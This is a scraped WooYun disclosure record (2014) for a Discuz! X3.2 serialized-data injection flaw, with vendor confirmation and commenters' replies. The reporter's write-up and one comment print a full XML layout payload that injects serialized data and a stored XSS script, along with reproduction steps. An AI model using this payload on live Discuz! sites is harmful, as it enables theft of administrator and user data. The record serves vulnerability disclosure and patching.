{"id": 48915, "wybug_id": "wooyun-2014-075963", "wybug_title": "Discuz！的addcslashes对序列化字符串处理不当造成数据注入", "wybug_corp": "Discuz!", "wybug_author": "刀尖上起舞", "wybug_date": "2014-09-13 19:57", "wybug_open_date": "2014-12-12 19:58", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-12：\t细节向公众公开  简要描述： 首先声明一点，这个漏洞2014-09-10在“腾讯安全应急响应中心”发过，账号现已放弃，对于腾讯不想多说什么问题描述：Discuz_X3.2及以下可盗取管理员、用户信息，蠕虫攻击等 详细说明：  source\\class\\discuz\\discuz_database.php public static function quote($str, $noarray = false) {\tif (is_string($str))\t\treturn '\\'' . addcslashes($str, \"\\n\\r\\\\'\\\"\\032\") . '\\'';..... source\\function\\function_core.phpfunction dunserialize($data) {\tif(($ret = unserialize($data)) === false) {\t\t$ret = unserialize(stripslashes($data));\t}\treturn $ret;}“return '\\'' . addcslashes($str, \"\\n\\r\\\\'\\\"\\032\") . '\\'';”这句会把ascii的1A转换成3个字符,分别是ascii的0H，33H，32H。通过提交1A可以让dunserialize()函数if返回false调用“$ret = unserialize(stripslashes($data));”，这句会将数据再次addcslashes一次，如果提交的数据中有\\就会产生数据的覆盖，比如'a:2{s:4:\"key1\";s:4:\"\\\\\\\\\";s:4:\"key2\";s:4:\"data\";}'会变成'a:2{s:4:\"key1\";s:4:\"\\\\\";s:4:\"key2\";s:4:\"data\";}'。如果这两个数据都是可提交的，就可以通过提交适当的\\造成注入而改写数组的值、增加数组、实例化对象等。   漏洞证明：  下面个人空间的XSS通过布局数组改写$blockdata['parameters'][$blockname]['title']参数的值绕过过滤  <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><root><item id=\"diypage\"><item id=\"frame`frame1\"><item id=\"attr\"><item id=\"name\"><![CDATA[frame1]]></item><item id=\"moveable\"><![CDATA[false]]></item><item id=\"className\"><![CDATA[frame cl]]></item><item id=\"titles\"></item></item><item id=\"column`frame1_left\"><item id=\"attr\"><item id=\"name\"><![CDATA[frame1_left]]></item><item id=\"className\"><![CDATA[z column]]></item></item><item id=\"block`profile\"><item id=\"attr\"><item id=\"name\"><![CDATA[profile]]></item><item id=\"className\"><![CDATA[block move-span]]></item><item id=\"titles\"><item id=\"0\"><item id=\"text\"><![CDATA[\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\]]></item> <item id=\"href\"><![CDATA[\";s:4:\"href\";s:0:\"\";s:5:\"color\";s:11:\" !important\";s:5:\"float\";s:0:\"\";s:6:\"margin\";s:0:\"\";s:9:\"font-size\";s:0:\"\";s:9:\"className\";s:0:\"\";s:3:\"src\";s:0:\"\";}s:9:\"className\";a:1:{i:0;s:16:\"blocktitle title\";}s:5:\"style\";s:0:\"\";}}}s:11:\"block`album\";a:1:{s:4:\"attr\";a:3:{s:4:\"name\";s:5:\"album\";s:9:\"className\";s:15:\"block move-span\";s:6:\"titles\";a:3:{i:0;a:8:{s:4:\"text\";s:4:\"相册\";s:4:\"href\";s:0:\"\";s:5:\"color\";s:11:\" !important\";s:5:\"float\";s:0:\"\";s:6:\"margin\";s:0:\"\";s:9:\"font-size\";s:0:\"\";s:9:\"className\";s:0:\"\";s:3:\"src\";s:0:\"\";}s:9:\"className\";a:1:{i:0;s:16:\"blocktitle title\";}s:5:\"style\";s:0:\"\";}}}}s:20:\"column`frame1_center\";a:1:{s:4:\"attr\";a:2:{s:4:\"name\";s:13:\"frame1_center\";s:9:\"className\";s:8:\"z column\";}}s:19:\"column`frame1_right\";a:1:{s:4:\"attr\";a:2:{s:4:\"name\";s:12:\"frame1_right\";s:9:\"className\";s:8:\"z column\";}}}}s:13:\"currentlayout\";s:5:\"1:2:1\";s:10:\"parameters\";a:2:{s:7:\"profile\";a:2:{s:5:\"title\";s:30:\"<script>alert(\"xss\");</script>\";s:9:\"banavatar\";s:6:\"middle\";}s:5:\"album\";a:2:{s:5:\"title\";s:4:\"相册\";s:7:\"shownum\";i:8;}}}]]></item><item id=\"color\"><![CDATA[ !important]]></item><item id=\"float\"><![CDATA[]]></item><item id=\"margin\"><![CDATA[]]></item><item id=\"font-size\"><![CDATA[]]></item><item id=\"className\"><![CDATA[]]></item><item id=\"src\"><![CDATA[]]></item></item><item id=\"className\"><item id=\"0\"><![CDATA[blocktitle title]]></item></item><item id=\"style\"></item></item></item></item><item id=\"block`album\"><item id=\"attr\"><item id=\"name\"><![CDATA[album]]></item><item id=\"className\"><![CDATA[block move-span]]></item><item id=\"titles\"><item id=\"0\"><item id=\"text\"><![CDATA[相册]]></item><item id=\"href\"><![CDATA[http://]]></item><item id=\"color\"><![CDATA[ !important]]></item><item id=\"float\"><![CDATA[]]></item><item id=\"margin\"><![CDATA[]]></item><item id=\"font-size\"><![CDATA[]]></item><item id=\"className\"><![CDATA[]]></item><item id=\"src\"><![CDATA[]]></item></item><item id=\"className\"><item id=\"0\"><![CDATA[blocktitle title]]></item></item><item id=\"style\"></item></item></item></item></item><item id=\"column`frame1_center\"><item id=\"attr\"><item id=\"name\"><![CDATA[frame1_center]]></item><item id=\"className\"><![CDATA[z column]]></item></item></item><item id=\"column`frame1_right\"><item id=\"attr\"><item id=\"name\"><![CDATA[frame1_right]]></item><item id=\"className\"><![CDATA[z column]]></item></item></item></item></item></root>home.php?mod=spacecp&ac=index1. urlencode编码xml布局修改layoutdata，post提交2. 空间首页，装扮空间，编辑相册，模块名称，ascii“1A5c5c5c”（引号中的）确定3. 再次编辑，确定（不用修改）最后保存空间\n\n\n\n\n\n\n\n   修复方案：  处理return '\\'' . addcslashes($str, \"\\n\\r\\\\'\\\"\\032\") . '\\'';语句的\\032   版权声明：转载请注明来源 刀尖上起舞@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-15 10:37 厂商回复： 路人甲是老朋友了，曾提出很多产品问题，这里再次感谢，我们会尽快处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-13 20:58 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  前排围观    \n     2014-09-13 20:59 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  dz最近好伤    \n     2014-09-13 21:55 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n  dz爆     \n     2014-09-13 23:46 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  发过就坐等忽略．．．    \n     2014-09-14 11:16 |    \t\t默秒全 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | a....)\t\t \n  dz还能不能用了(╯‵□′)╯︵┻━┻    \n     2014-09-14 11:23 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  直接公开吧！@疯狗    \n     2014-09-14 12:23 |    \t\t小森森 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 不中二 枉少年)\t\t \n  可怕……感觉不敢用了……dz代码里好像各种addslashes    \n     2014-09-15 10:41 |    \t\tHmily \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 吾爱破解论坛)\t\t \n  @Discuz!尽快处理你妹妹，三个月前的漏洞都公开了你补丁还没发，整天在这确认你妹妹！！！    \n     2014-09-15 11:50 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Hmily 克制    \n     2014-09-15 12:01 |    \t\t刀尖上起舞 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:1        )\t\t \n  修正一下错误，“这句会将数据再次addcslashes一次”，是这样“这句会将数据再次stripslashes一次”    \n     2014-10-05 22:49 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  为毛没成功。。。    \n     2014-10-10 13:43 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  [CDATA[\";s:4:\"href\";s:0:\"\";s:5:\"color\";s:11:\" !important\";s:5:\"float\";s:0:\"\";s:6:\"margin\";s:0:\"\";s:9:\"font-size\";s:0:\"\";s:9:\"className\";s:0:\"\";s:3:\"src\";s:0:\"\";}s:9:\"className\";a:1:{i:0;s:16:\"blocktitle title\";}s:5:\"style\";s:0:\"\";}}}s:11:\"block`album\";a:1:{s:4:\"attr\";a:3:{s:4:\"name\";s:5:\"album\";s:9:\"className\";s:15:\"blockmove-span\";s:6:\"titles\";a:3:{i:0;a:8:{s:4:\"text\";s:4:\"相册\";s:4:\"href\";s:0:\"\";s:5:\"color\";s:11:\" !important\";s:5:\"float\";s:0:\"\";s:6:\"margin\";s:0:\"\";s:9:\"font-size\";s:0:\"\";s:9:\"className\";s:0:\"\";s:3:\"src\";s:0:\"\";}s:9:\"className\";a:1:{i:0;s:16:\"blocktitle title\";}s:5:\"style\";s:0:\"\";}}}}s:20:\"column`frame1_center\";a:1:{s:4:\"attr\";a:2:{s:4:\"name\";s:13:\"frame1_center\";s:9:\"className\";s:8:\"z column\";}}s:19:\"column`frame1_right\";a:1:{s:4:\"attr\";a:2:{s:4:\"name\";s:12:\"frame1_right\";s:9:\"className\";s:8:\"z column\";}}}}s:13:\"currentlayout\";s:5:\"1:2:1\";s:10:\"parameters\";a:2:{s:7:\"profile\";a:2:{s:5:\"title\";s:30:\"<script>alert(\"xss\");</script>\";s:9:\"banavatar\";s:6:\"middle\";}s:5:\"album\";a:2:{s:5:\"title\";s:4:\"相册\";s:7:\"shownum\";i:8;}}}]]好像这个都是一个url带过了    \n     2014-10-10 14:52 |    \t\t刀尖上起舞 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:1        )\t\t \n  @mango 你想表达什么？我想说明的是serialize序列化后的字符串是可以伪造的，unserialize的时候并不会验证整个字符串。而Discuz! 的dunserialize这个函数恰恰可以产生两种语义，一个数据库字符截断就可以重写数据结构。这个问题可以说很简单，对于Discuz!会比较麻烦，x版本用了太多的dunserialize，而这个函数根本就是错误的！    \n     2014-12-12 23:20 |    \t\t多情公子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | google)\t\t \n  好屌...    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}